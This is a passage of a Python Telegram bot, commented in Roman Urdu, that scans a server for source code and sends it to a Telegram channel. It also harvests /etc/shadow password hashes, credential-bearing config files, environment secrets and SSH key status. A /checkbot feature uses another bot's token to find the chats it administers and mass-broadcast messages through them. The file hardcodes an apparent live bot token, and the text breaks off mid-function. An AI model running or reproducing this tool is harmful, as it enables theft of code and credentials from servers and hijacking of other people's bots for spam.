#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║         VPS / Cloud Source Code Sender Bot               ║
║  Platform auto-detect: VPS · Railway · Render · Replit   ║
║  Password protected — /start se enter karo               ║
╚══════════════════════════════════════════════════════════╝

SIRF YEH DO CHEEZEIN KAREIN:
  BOT_TOKEN       = "apka_token_yahan"   ← Line 38 pe
  MASTER_PASSWORD = "KamranBaloch"       ← Line 41 pe (change kar saktay ho)
"""

import os, re, json, asyncio, logging, platform, socket, urllib.request, urllib.parse, subprocess
from pathlib import Path
from html import escape
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import TelegramError, RetryAfter, TimedOut
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ConversationHandler, ContextTypes, filters,
)

# ══════════════════════════════════════════════════════════
#  ★  YAHAN APNA TOKEN DAALO  ★
# ══════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "8915090106:AAECMQrmIo-1hJA9ngDqJlZBiT27fYBBOKs")

# ★  PASSWORD — koi bhi /start kare, pehle yeh dena hoga  ★
MASTER_PASSWORD = os.getenv("MASTER_PASSWORD", "Python")
# ══════════════════════════════════════════════════════════

CONFIG_FILE = Path(__file__).parent / "config.json"

# Source code extensions ONLY
SCAN_EXTS   = {".py", ".js", ".ts", ".sh", ".php", ".rb", ".go",
               ".java", ".rs", ".cs", ".cpp", ".c"}

SKIP_DIRS   = {"node_modules", "__pycache__", ".git", "venv", ".venv",
               "dist", "build", ".next", ".nuxt", "vendor", "target",
               ".ssh", ".gnupg", ".config"}
MAX_FILE_MB = 8
SEND_DELAY  = 0.4
MAX_RETRIES = 3

# ConversationHandler states
ASK_CHANNEL, ASK_CONFIRM = range(2)
WAIT_PASSWORD = 10
BC_MSG, BC_COUNT = 30, 31   # Broadcast conversation states

# Scan state keys in bot_data
ACTIVE_SCAN_KEY  = "active_scan_uid"
STOP_SCAN_KEY    = "stop_scan_flag"
AUTH_USERS_KEY   = "authenticated_users"   # set of user IDs
AUTH_ATTEMPTS    = "auth_attempts"          # dict uid → fail count
AUTH_LOCKOUT     = "auth_lockout"           # dict uid → lockout timestamp
MAX_AUTH_TRIES   = 5                        # 5 galat attempts
LOCKOUT_SECONDS  = 1800                     # 30 minute lockout

logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger(__name__)


# ─────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────

def load_cfg() -> dict:
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text())
        except Exception:
            pass
    return {"channel": "", "scan_dirs": []}


def save_cfg(cfg: dict):
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2))


# ─────────────────────────────────────────
#  AUTH — password-based
# ─────────────────────────────────────────

def is_authenticated(uid: int, application) -> bool:
    return uid in application.bot_data.get(AUTH_USERS_KEY, set())


def authenticate(uid: int, application):
    if AUTH_USERS_KEY not in application.bot_data:
        application.bot_data[AUTH_USERS_KEY] = set()
    application.bot_data[AUTH_USERS_KEY].add(uid)


# ─────────────────────────────────────────
#  SCAN SESSION CONTROL
# ─────────────────────────────────────────

def start_scan_session(application, uid: int):
    application.bot_data[ACTIVE_SCAN_KEY] = uid
    application.bot_data[STOP_SCAN_KEY]   = False

def end_scan_session(application):
    application.bot_data[ACTIVE_SCAN_KEY] = None
    application.bot_data[STOP_SCAN_KEY]   = False

def request_stop(application):
    application.bot_data[STOP_SCAN_KEY] = True

def is_scan_running(application) -> bool:
    return bool(application.bot_data.get(ACTIVE_SCAN_KEY))

def is_stop_requested(application) -> bool:
    return bool(application.bot_data.get(STOP_SCAN_KEY, False))


# ─────────────────────────────────────────
#  PLATFORM DETECTION
# ─────────────────────────────────────────

def detect_platform() -> dict:
    env = os.environ

    if env.get("REPL_ID") or env.get("REPL_SLUG"):
        return {"name": "Replit", "icon": "🔵", "is_vps": False,
                "scan_dirs": ["/home/runner", str(Path.home()), str(Path.cwd())],
                "env_keys": ["REPL_ID", "REPL_SLUG", "REPL_OWNER", "REPLIT_DB_URL"]}

    if env.get("RAILWAY_ENVIRONMENT") or env.get("RAILWAY_SERVICE_NAME"):
        return {"name": "Railway", "icon": "🚂", "is_vps": False,
                "scan_dirs": [str(Path.cwd()), "/app", "/workspace"],
                "env_keys": ["RAILWAY_ENVIRONMENT", "RAILWAY_SERVICE_NAME", "DATABASE_URL", "PORT"]}

    if env.get("RENDER") or env.get("RENDER_SERVICE_NAME"):
        return {"name": "Render", "icon": "🟣", "is_vps": False,
                "scan_dirs": [str(Path.cwd()), "/opt/render/project/src"],
                "env_keys": ["RENDER_SERVICE_NAME", "RENDER_EXTERNAL_URL", "DATABASE_URL", "PORT"]}

    if env.get("DYNO") or env.get("HEROKU_APP_NAME"):
        return {"name": "Heroku", "icon": "🟤", "is_vps": False,
                "scan_dirs": [str(Path.cwd()), "/app"],
                "env_keys": ["DYNO", "HEROKU_APP_NAME", "DATABASE_URL", "PORT"]}

    if env.get("FLY_APP_NAME") or env.get("FLY_REGION"):
        return {"name": "Fly.io", "icon": "🪁", "is_vps": False,
                "scan_dirs": [str(Path.cwd()), "/app"],
                "env_keys": ["FLY_APP_NAME", "FLY_REGION", "DATABASE_URL", "PORT"]}

    if env.get("DO_APP_ID") or env.get("DO_SPACE_NAME"):
        return {"name": "DigitalOcean App Platform", "icon": "🌊", "is_vps": False,
                "scan_dirs": [str(Path.cwd()), "/workspace"],
                "env_keys": ["DO_APP_ID", "DO_APP_NAME", "DATABASE_URL"]}

    if env.get("CODESPACE_NAME") or env.get("GITHUB_CODESPACE_TOKEN"):
        return {"name": "GitHub Codespaces", "icon": "🐙", "is_vps": False,
                "scan_dirs": [str(Path.cwd()), str(Path.home() / "workspace")],
                "env_keys": ["CODESPACE_NAME", "GITHUB_REPOSITORY", "GITHUB_USER"]}

    seen_dirs: list[str] = []

    def _add(d: str):
        if d and d not in seen_dirs and Path(d).exists():
            seen_dirs.append(d)

    # 1. Config-saved dirs first (user-specified)
    cfg = load_cfg()
    for d in cfg.get("scan_dirs", []):
        _add(d)

    # 2. Current working directory — where the bot is actually running
    _add(str(Path.cwd()))

    # 3. Home directory of current user
    _add(str(Path.home()))

    # 4. /root (common for root-run bots)
    _add("/root")

    # 5. Common deployment paths (Docker, VPS, shared hosting)
    for d in ["/app", "/code", "/workspace", "/data", "/bot",
              "/var/app", "/usr/local/app", "/srv", "/opt",
              "/var/www", "/var/www/html"]:
        _add(d)

    # 6. All /home/* user subdirectories
    home_dir = Path("/home")
    if home_dir.exists():
        try:
            for sub in sorted(home_dir.iterdir()):
                if sub.is_dir():
                    _add(str(sub))
        except Exception:
            pass
        _add("/home")

    # 7. Find any directory containing a bot.py / main.py / app.py
    for pattern_dir in ["/", "/root", "/app", "/opt", "/srv"]:
        try:
            result = subprocess.run(
                ["find", pattern_dir, "-maxdepth", "4",
                 "-name", "bot.py", "-o", "-name", "main.py", "-o", "-name", "app.py"],
                capture_output=True, text=True, timeout=8
            )
            for line in result.stdout.splitlines():
                parent = str(Path(line).parent)
                _add(parent)
        except Exception:
            pass

    return {"name": "VPS / Server", "icon": "🖥️", "is_vps": True,
            "scan_dirs": seen_dirs, "env_keys": []}


def get_env_keys_present(keys: list[str]) -> list[str]:
    return [k for k in keys if os.environ.get(k)]


# ─────────────────────────────────────────
#  VPS LOGIN + PASSWORD COLLECTOR
# ─────────────────────────────────────────

def _run(cmd: list, timeout: int = 5) -> str:
    """Helper — run subprocess safely."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip() if r.returncode == 0 else ""
    except Exception:
        return ""


def collect_vps_info() -> str:
    lines = []

    # ── Basic info ──────────────────────────────────────────
    try:
        lines.append(f"🖥️ Hostname: <code>{h(socket.gethostname())}</code>")
    except Exception:
        lines.append("🖥️ Hostname: unknown")

    for ip_url in ["https://api.ipify.org", "https://icanhazip.com", "https://checkip.amazonaws.com"]:
        try:
            with urllib.request.urlopen(ip_url, timeout=5) as r:
                lines.append(f"🌐 Public IP: <code>{h(r.read().decode().strip())}</code>")
                break
        except Exception:
            pass
    else:
        lines.append("🌐 Public IP: <i>detect nahi hua</i>")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lines.append(f"📡 Local IP: <code>{h(s.getsockname()[0])}</code>")
        s.close()
    except Exception:
        pass

    try:
        import pwd
        current_user = pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        try:
            current_user = os.getlogin()
        except Exception:
            current_user = str(os.getuid())
    lines.append(f"👤 Current user: <code>{h(current_user)}</code>")
    lines.append(f"🐧 OS: <code>{h(platform.system())} {h(platform.release())}</code>")
    lines.append(f"🏗️ Arch: <code>{h(platform.machine())}</code>")
    lines.append(f"📂 Working Dir: <code>{h(str(Path.cwd()))}</code>")

    try:
        with open("/proc/uptime") as f:
            uptime_sec = float(f.read().split()[0])
        d = int(uptime_sec // 86400); hh = int((uptime_sec % 86400) // 3600); mm = int((uptime_sec % 3600) // 60)
        lines.append(f"⏱️ Uptime: <code>{d}d {hh}h {mm}m</code>")
    except Exception:
        pass

    # ── PASSWORD DETECTION ───────────────────────────────────
    lines.append("\n🔐 <b>PASSWORD / CREDENTIAL SCAN</b>")

    # /etc/shadow — user password hashes
    shadow_found = False
    try:
        shadow_lines = Path("/etc/shadow").read_text().splitlines()
        real_users = []
        for sl in shadow_lines:
            parts = sl.split(":")
            if len(parts) < 2:
                continue
            uname, pw_hash = parts[0], parts[1]
            if pw_hash in ("", "*", "!!", "x"):
                status = "❌ No password / locked"
            elif pw_hash.startswith("$1$"):
                status = f"🔓 MD5 hash: <code>{h(pw_hash)}</code>"
            elif pw_hash.startswith("$5$"):
                status = f"🔓 SHA-256 hash: <code>{h(pw_hash)}</code>"
            elif pw_hash.startswith("$6$"):
                status = f"🔓 SHA-512 hash: <code>{h(pw_hash)}</code>"
            elif pw_hash.startswith("$y$") or pw_hash.startswith("$2b$"):
                status = f"🔓 yescrypt/bcrypt hash: <code>{h(pw_hash[:40])}...</code>"
            elif pw_hash:
                status = f"🔓 Hash: <code>{h(pw_hash[:50])}</code>"
            else:
                continue
            real_users.append(f"  👤 <code>{h(uname)}</code>: {status}")
        if real_users:
            lines.append("📋 /etc/shadow password hashes:")
            lines.extend(real_users[:10])
            shadow_found = True
    except PermissionError:
        lines.append("  ⚠️ /etc/shadow: permission denied (root nahi hain)")
    except FileNotFoundError:
        lines.append("  ⚠️ /etc/shadow: file nahi mili")
    except Exception as e:
        lines.append(f"  ⚠️ /etc/shadow error: {h(str(e)[:50])}")

    # PAM / pam.d config
    try:
        pam_common = Path("/etc/pam.d/common-password").read_text()
        if "nullok" in pam_common:
            lines.append("  ⚠️ PAM config: <b>nullok</b> — empty passwords allowed!")
    except Exception:
        pass

    # Known weak / default creds in env vars
    weak_keys = ["PASSWORD", "PASSWD", "PASS", "DB_PASSWORD", "DATABASE_PASSWORD",
                 "MYSQL_PASSWORD", "POSTGRES_PASSWORD", "REDIS_PASSWORD", "SECRET_KEY",
                 "SECRET", "API_SECRET", "ROOT_PASSWORD", "ADMIN_PASSWORD"]
    env_creds = []
    for k in weak_keys:
        val = os.environ.get(k, "")
        if val:
            masked = val[:3] + "***" + val[-2:] if len(val) > 5 else "***"
            env_creds.append(f"  🔑 <code>{h(k)}</code> = <code>{h(masked)}</code> (len={len(val)})")
    if env_creds:
        lines.append("🌍 Password-like ENV vars mili hain:")
        lines.extend(env_creds[:8])

    # Common config files with passwords
    config_paths = [
        "/root/.my.cnf", "/etc/mysql/debian.cnf",
        "/var/www/html/wp-config.php", "/var/www/html/config.php",
        "/etc/nginx/.htpasswd", "/etc/apache2/.htpasswd",
        str(Path.home() / ".pgpass"),
        str(Path.cwd() / ".env"),
        str(Path.cwd() / "config.json"),
        str(Path.cwd() / "settings.py"),
    ]
    cred_re = re.compile(r'(password|passwd|secret|db_pass|mysql_pass|pg_pass)\s*[=:]\s*["\']?([^\s"\'<>]{4,50})',
                         re.IGNORECASE)
    for cp in config_paths:
        try:
            content = Path(cp).read_text(errors="ignore")
            matches = cred_re.findall(content)
            if matches:
                lines.append(f"📄 <code>{h(cp)}</code> mein credentials mile:")
                for key, val in matches[:4]:
                    masked = val[:3] + "***" + val[-2:] if len(val) > 5 else "***"
                    lines.append(f"  🔑 {h(key)} = <code>{h(masked)}</code>")
        except Exception:
            pass

    if not shadow_found and not env_creds:
        lines.append("  ℹ️ Koi plain-text password nahi mila (normal hai — hashes /etc/shadow mein hain)")

    # ── SSH ──────────────────────────────────────────────────
    for key_path in [Path.home() / ".ssh" / "authorized_keys", Path("/root/.ssh/authorized_keys")]:
        try:
            content = key_path.read_text().strip()
            if content:
                key_count = len([l for l in content.splitlines() if l.strip() and not l.startswith("#")])
                lines.append(f"🔑 SSH {key_path}: <code>{key_count} key(s)</code>")
        except Exception:
            pass

    # Check for unencrypted SSH private keys
    for key_path in [Path.home() / ".ssh" / "id_rsa", Path("/root/.ssh/id_rsa"),
                     Path.home() / ".ssh" / "id_ed25519"]:
        try:
            content = key_path.read_text()
            if "BEGIN" in content and "PRIVATE KEY" in content:
                encrypted = "ENCRYPTED" in content
                enc_str = "🔒 encrypted" if encrypted else "⚠️ <b>UNENCRYPTED!</b>"
                lines.append(f"🗝️ Private key {key_path.name}: {enc_str}")
        except Exception:
            pass

    # ── Users & processes ─────────────────────────────────────
    try:
        passwd_lines = Path("/etc/passwd").read_text().splitlines()
        login_users = [l for l in passwd_lines if "/bin/bash" in l or "/bin/sh" in l]
        if login_users:
            lines.append("👥 Login users (/etc/passwd):")
            for u in login_users[:8]:
                parts = u.split(":")
                if len(parts) >= 7:
                    lines.append(f"  • <code>{h(parts[0])}</code> — home: <code>{h(parts[5])}</code>")
    except Exception:
        pass

    ps_out = _run(["ps", "aux", "--sort=-%cpu"])
    if ps_out:
        ps_lines = ps_out.splitlines()
        top_procs = ps_lines[1:6]
        lines.append("⚙️ Top processes:")
        for p in top_procs:
            cols = p.split(None, 10)
            if len(cols) >= 11:
                lines.append(f"  • <code>{h(cols[0])}</code> CPU:<code>{h(cols[2])}%</code> — {h(cols[10][:60])}")

    ifaces = _run(["ip", "addr", "show"])
    if ifaces:
        ips = re.findall(r"inet (\d+\.\d+\.\d+\.\d+)/", ifaces)
        if ips:
            lines.append("🌐 All IPs: " + " | ".join(f"<code>{h(ip)}</code>" for ip in ips[:6]))

    ports = _run(["ss", "-tlnp"])
    if ports:
        port_lines = ports.splitlines()[1:8]
        if port_lines:
            lines.append("🔓 Listening ports:")
            for pl in port_lines:
                cols = pl.split()
                if len(cols) >= 4:
                    lines.append(f"  • <code>{h(cols[3])}</code>")

    try:
        cron = Path("/etc/crontab").read_text().strip()
        cron_lines = [l for l in cron.splitlines() if l.strip() and not l.startswith("#")][:5]
        if cron_lines:
            lines.append("⏰ Cron jobs:")
            for cl in cron_lines:
                lines.append(f"  • <code>{h(cl[:80])}</code>")
    except Exception:
        pass

    lines.append(f"\n⏰ Time: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>")
    return "\n".join(lines)


# ─────────────────────────────────────────
#  TOKEN / SECRET SCANNER
# ─────────────────────────────────────────

_TG_TOKEN_RE = re.compile(r"\b(\d{8,12}:[A-Za-z0-9_-]{35,})\b")
_SECRET_RE   = re.compile(
    r'(?:token|api[_\-]?key|secret|password|passwd|auth)["\s]*[=:]["\s]*([A-Za-z0-9_\-]{16,})',
    re.IGNORECASE,
)


def scan_file_for_tokens(filepath: Path) -> tuple[list[str], list[str]]:
    display_findings, raw_tokens = [], []
    try:
        text = filepath.read_text(errors="ignore")
        for m in _TG_TOKEN_RE.finditer(text):
            raw = m.group(1)
            masked = raw[:8] + ":***..." + raw[-4:]
            display_findings.append(f"🔑 TG Token: <code>{masked}</code>")
            raw_tokens.append(raw)
        for m in _SECRET_RE.finditer(text):
            val = m.group(1)
            if not _TG_TOKEN_RE.search(val):
                masked = val[:4] + "***" + val[-2:]
                display_findings.append(f"🗝️ Secret: <code>{masked}</code>")
    except (OSError, UnicodeDecodeError):
        pass
    return display_findings, raw_tokens


async def resolve_bot_username(token: str) -> str:
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        def _fetch():
            with urllib.request.urlopen(url, timeout=5) as r:
                return json.loads(r.read().decode())
        data = await asyncio.to_thread(_fetch)
        if data.get("ok"):
            u = data["result"]
            username = u.get("username", "")
            name = u.get("first_name", "")
            return f"@{username} ({h(name)})" if username else h(name)
    except Exception:
        pass
    return "<i>username fetch nahi hua</i>"


async def step(msg, text: str):
    try:
        await msg.edit_text(text, parse_mode="HTML")
    except TelegramError:
        pass
    await asyncio.sleep(0.3)


# ─────────────────────────────────────────
#  FILE SCANNING
# ─────────────────────────────────────────

def scan_directory(directory: str) -> list[Path]:
    base = Path(directory)
    if not base.exists():
        return []
    files = []
    try:
        for item in base.rglob("*"):
            if any(skip in item.parts for skip in SKIP_DIRS):
                continue
            if not item.is_file():
                continue
            if item.suffix.lower() not in SCAN_EXTS:
                continue
            try:
                if item.stat().st_size / (1024 * 1024) <= MAX_FILE_MB:
                    files.append(item)
            except OSError:
                continue
    except PermissionError:
        log.warning(f"Permission denied: {directory}")
    return sorted(files)


def gather_all_files(scan_dirs: list[str]) -> list[Path]:
    seen, all_files = set(), []
    for d in scan_dirs:
        for f in scan_directory(d):
            try:
                inode = (f.stat().st_dev, f.stat().st_ino)
                if inode not in seen:
                    seen.add(inode)
                    all_files.append(f)
            except OSError:
                all_files.append(f)
    return all_files


def sort_files_big_to_small(files: list[Path]) -> list[Path]:
    def safe_size(p: Path):
        try: return p.stat().st_size
        except OSError: return 0
    return sorted(files, key=safe_size, reverse=True)


# ─────────────────────────────────────────
#  TELEGRAM SEND HELPERS
# ─────────────────────────────────────────

def h(text) -> str:
    return escape(str(text))


async def send_doc(context, filepath: Path, caption: str, channel_id: str) -> bool:
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            with open(filepath, "rb") as f:
                await context.bot.send_document(
                    chat_id=channel_id, document=f, filename=filepath.name,
                    caption=caption, parse_mode="HTML",
                )
            return True
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except TimedOut:
            await asyncio.sleep(2 * attempt)
        except TelegramError as e:
            log.error(f"Telegram error: {e}")
            return False
        except OSError as e:
            log.error(f"File error: {e}")
            return False
    return False


async def send_text(context, chat_id: str | int, text: str) -> bool:
    try:
        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
        return True
    except TelegramError as e:
        log.error(f"Send text error: {e}")
        return False


# ─────────────────────────────────────────
#  /checkbot — token se admin chats dhundho
# ─────────────────────────────────────────

async def checkbot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /checkbot <token>
    Token se bot ka info, aur kin chats/channels mein admin hai — permissions ke saath.
    """
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: <code>/checkbot &lt;bot_token&gt;</code>\n\n"
            "Example:\n<code>/checkbot 123456789:AABBCCDDaabbccdd...</code>",
            parse_mode="HTML",
        )
        return

    token = args[0].strip()
    if not _TG_TOKEN_RE.match(token):
        await update.message.reply_text("❌ Token format galat lag raha hai.\n<code>12345:AABBCCaabbcc...</code>", parse_mode="HTML")
        return

    msg = await update.message.reply_text("🔍 Bot info fetch kar raha hoon...")

    # ── Step 1: getMe ────────────────────────────────────────
    def _get_me():
        with urllib.request.urlopen(f"https://api.telegram.org/bot{token}/getMe", timeout=8) as r:
            return json.loads(r.read().decode())

    try:
        me_data = await asyncio.to_thread(_get_me)
    except Exception as e:
        await msg.edit_text(f"❌ Token invalid ya network error:\n<code>{h(str(e))}</code>", parse_mode="HTML")
        return

    if not me_data.get("ok"):
        await msg.edit_text(f"❌ Telegram error: <code>{h(me_data.get('description', 'unknown'))}</code>", parse_mode="HTML")
        return

    bot_info = me_data["result"]
    bot_id   = bot_info["id"]
    bot_name = bot_info.get("first_name", "")
    bot_user = bot_info.get("username", "")

    await step(msg,
        f"✅ Bot mil gaya!\n\n"
        f"🤖 Name: <b>{h(bot_name)}</b>\n"
        f"📛 Username: @{h(bot_user)}\n"
        f"🆔 ID: <code>{bot_id}</code>\n\n"
        f"🔍 Recent chats dhoondh raha hoon..."
    )

    # ── Step 2: getUpdates — recent chat IDs nikalo ──────────
    def _get_updates():
        url = f"https://api.telegram.org/bot{token}/getUpdates?limit=100&timeout=0"
        with urllib.request.urlopen(url, timeout=10) as r:
            return json.loads(r.read().decode())

    chat_ids: set[int] = set()
    try:
        upd_data = await asyncio.to_thread(_get_updates)
        if upd_data.get("ok"):
            for upd in upd_data.get("result", []):
                # Extract from message, channel_post, my_chat_member, etc.
                for key in ["message", "edited_message", "channel_post", "edited_channel_post",
                            "callback_query", "my_chat_member", "chat_member"]:
                    item = upd.get(key)
                    if item:
                        chat = item.get("chat") or item.get("message", {}).get("chat")
                        if chat and chat.get("id"):
                            chat_ids.add(chat["id"])
    except Exception:
        pass

    # ── Step 3: har chat mein admin status check karo ────────
    def _check_admin(chat_id: int):
        try:
            url = f"https://api.telegram.org/bot{token}/getChatMember?chat_id={chat_id}&user_id={bot_id}"
            with urllib.request.urlopen(url, timeout=8) as r:
                data = json.loads(r.read().decode())
            if data.get("ok"):
                return data["result"]
        except Exception:
            pass
        return None

    def _get_chat_info(chat_id: int):
        try:
            url = f"https://api.telegram.org/bot{token}/getChat?chat_id={chat_id}"
            with urllib.request.urlopen(url, timeout=8) as r:
                data = json.loads(r.read().decode())
            if data.get("ok"):
                return data["result"]
        except Exception:
            pass
        return None

    admin_chats  = []
    member_chats = []

    if not chat_ids:
        result_text = (
            f"🤖 <b>@{h(bot_user)}</b> (<code>{bot_id}</code>)\n\n"
            f"⚠️ <b>Koi recent chat activity nahi mili.</b>\n\n"
            f"Possible reasons:\n"
            f"• Bot ne koi message nahi receive kiya haal mein\n"
            f"• Bot kisi channel mein sirf post karta hai (messages nahi receive karta)\n"
            f"• getUpdates already consume ho chuki hain (bot chal raha tha)\n\n"
            f"💡 Bot ke channel IDs manually <code>/checkbot</code> mein dene ki zaroorat padegi."
        )
    else:
        await step(msg, f"🔍 {len(chat_ids)} chats mein admin check kar raha hoon...")

        for chat_id in chat_ids:
            member = await asyncio.to_thread(_check_admin, chat_id)
            if not member:
                continue
            status = member.get("status", "")
            chat_info = await asyncio.to_thread(_get_chat_info, chat_id)
            chat_name = ""
            chat_type = ""
            if chat_info:
                chat_name = chat_info.get("title") or chat_info.get("username") or str(chat_id)
                chat_type = chat_info.get("type", "")

            if status in ("administrator", "creator"):
                # Get permissions
                perms = []
                if status == "creator":
                    perms = ["👑 Creator (all perms)"]
                else:
                    perm_map = {
                        "can_post_messages":     "📤 Post",
                        "can_edit_messages":     "✏️ Edit msgs",
                        "can_delete_messages":   "🗑️ Delete",
                        "can_manage_chat":       "⚙️ Manage chat",
                        "can_change_info":       "📝 Change info",
                        "can_invite_users":      "👥 Invite users",
                        "can_pin_messages":      "📌 Pin msgs",
                        "can_manage_video_chats":"🎥 Video chats",
                        "can_promote_members":   "⬆️ Promote",
                        "can_restrict_members":  "🚫 Restrict",
                        "is_anonymous":          "🎭 Anonymous",
                    }
                    for key, label in perm_map.items():
                        if member.get(key):
                            perms.append(label)
                admin_chats.append({
                    "id": chat_id, "name": chat_name, "type": chat_type,
                    "status": status, "perms": perms,
                })
            else:
                member_chats.append({"id": chat_id, "name": chat_name, "type": chat_type, "status": status})

        # Build result
        type_icons = {"channel": "📢", "group": "👥", "supergroup": "👥", "private": "👤"}

        lines = [f"🤖 <b>@{h(bot_user)}</b> (<code>{bot_id}</code>) — Admin Report\n{'═'*30}"]

        if admin_chats:
            lines.append(f"\n✅ <b>Admin hain ({len(admin_chats)} chats mein):</b>")
            for c in admin_chats:
                icon = type_icons.get(c["type"], "💬")
                perms_str = " | ".join(c["perms"]) if c["perms"] else "no perms listed"
                # Build link/username
                uname = c.get("username", "")
                link_str = f'<a href="https://t.me/{uname}">@{h(uname)}</a>' if uname else ""
                lines.append(
                    f"\n{icon} <b>{h(c['name'])}</b>"
                    + (f" — {link_str}" if link_str else "") +
                    f" [{c['type']}]\n"
                    f"   🆔 <code>{c['id']}</code>\n"
                    f"   👑 Status: {c['status']}\n"
                    f"   🔧 Perms: {perms_str}"
                )
        else:
            lines.append("\n❌ Kisi bhi chat mein admin nahi hai (ya recent activity nahi mili)")

        if member_chats:
            lines.append(f"\n\n👤 <b>Member (admin nahi) — {len(member_chats)} chats:</b>")
            for c in member_chats:
                icon = type_icons.get(c["type"], "💬")
                uname = c.get("username", "")
                link_str = f' @{h(uname)}' if uname else ""
                lines.append(f"  {icon} {h(c['name'])}{link_str} [{c['type']}] — {c['status']}")

        lines.append(f"\n\n🔍 <i>Total chats checked: {len(chat_ids)}</i>")
        result_text = "\n".join(lines)

    # ── Store for broadcast ───────────────────────────────────
    context.user_data["last_checkbot"] = {
        "token":    token,
        "bot_user": bot_user,
        "admin_chat_ids": [c["id"] for c in admin_chats],
        "admin_chats":    admin_chats,
    }

    # ── Send result + broadcast button ────────────────────────
    bc_keyboard = None
    if admin_chats:
        bc_keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("📣 Broadcast", callback_data="bc_start"),
        ]])

    if len(result_text) > 4000:
        chunks = [result_text[i:i+4000] for i in range(0, len(result_text), 4000)]
        await msg.edit_text(chunks[0], parse_mode="HTML")
        for chunk in chunks[1:-1]:
            await update.message.reply_text(chunk, parse_mode="HTML")
        await update.message.reply_text(chunks[-1], parse_mode="HTML",
                                         reply_markup=bc_keyboard)
    else:
        await msg.edit_text(result_text, parse_mode="HTML", reply_markup=bc_keyboard)


# ─────────────────────────────────────────
#  BROADCAST CONVERSATION (/checkbot → 📣 Broadcast)
# ─────────────────────────────────────────

async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    bc = context.user_data.get("last_checkbot")
    if not bc or not bc.get("admin_chat_ids"):
        await query.message.reply_text("❌ Koi admin chats nahi mili. Pehle /checkbot run karein.")
        return ConversationHandler.END
    bot_user = bc.get("bot_user", "")
    count    = len(bc["admin_chat_ids"])
    await query.message.reply_text(
        f"📣 <b>Broadcast Setup</b>\n\n"
        f"🤖 Bot: @{h(bot_user)}\n"
        f"📢 Channels/Groups: <b>{count}</b>\n\n"
        f"Woh message bhejo jo broadcast karna hai:\n"
        f"<i>(/cancel se rok sakte hain)</i>",
        parse_mode="HTML",
    )
    return BC_MSG


async def broadcast_msg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["bc_message"] = update.message.text
    bc    = context.user_data.get("last_checkbot", {})
    count = len(bc.get("admin_chat_ids", []))
    await update.message.reply_text(
        f"✅ Message save ho gaya.\n\n"
        f"📢 <b>{count} channels/groups</b> mein bhejunga.\n\n"
        f"Har channel mein <b>kitni baar</b> bhejun? (1–10 number likhein):",
        parse_mode="HTML",
    )
    return BC_COUNT


async def broadcast_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    txt = update.message.text.strip()
    try:
        repeat = max(1, min(10, int(txt)))
    except ValueError:
        await update.message.reply_text("❌ Sirf number likhein (1–10):")
        return BC_COUNT

    bc       = context.user_data.get("last_checkbot", {})
    token    = bc.get("token", "")
    chat_ids = bc.get("admin_chat_ids", [])
    message  = context.user_data.get("bc_message", "")

    if not token or not chat_ids:
        await update.message.reply_text("❌ Data missing. /checkbot dobara run karein.")
        return ConversationHandler.END

    msg  = await update.message.reply_text(
        f"📣 Broadcast shuru...\n0/{len(chat_ids)} channels | ×{repeat}",
    )
    sent = failed = 0

    def _send_msg(chat_id, tok, text):
        data = urllib.parse.urlencode({"chat_id": chat_id, "text": text}).encode()
        url  = f"https://api.telegram.org/bot{tok}/sendMessage"
        with urllib.request.urlopen(url, data=data, timeout=10) as r:
            return json.loads(r.read().decode())

    for i, chat_id in enumerate(chat_ids, 1):
        for _ in range(repeat):
            try:
                res = await asyncio.to_thread(_send_msg, chat_id, token, message)
                if res.get("ok"):
                    sent += 1
                else:
                    failed += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.15)
        try:
            await msg.edit_text(
                f"📣 Broadcast: {i}/{len(chat_ids)} channels\n✅ {sent}  ❌ {failed}"
            )
        except TelegramError:
            pass

    await msg.edit_text(
        f"✅ <b>Broadcast Complete!</b>\n\n"
        f"📢 Channels: <b>{len(chat_ids)}</b>\n"
        f"🔁 Har channel mein: <b>×{repeat}</b>\n"
        f"✅ Sent: <b>{sent}</b>  ❌ Failed: <b>{failed}</b>",
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def broadcast_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Broadcast cancel ho gaya.")
    return ConversationHandler.END


# ─────────────────────────────────────────
#  SETUP CONVERSATION
# ─────────────────────────────────────────

async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    if not is_authenticated(uid, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return ConversationHandler.END

    cfg = load_cfg()
    current = f"<code>{h(cfg['channel'])}</code>" if cfg["channel"] else "<i>set nahi</i>"
    await update.message.reply_text(
        f"⚙️ <b>Bot Setup</b>\n\n📢 Current channel: {current}\n\n"
        f"Apna Telegram channel ID ya username bhejo:\n"
        f"<code>@channel_username</code>\n<code>-100xxxxxxxxxx</code>\n\n"
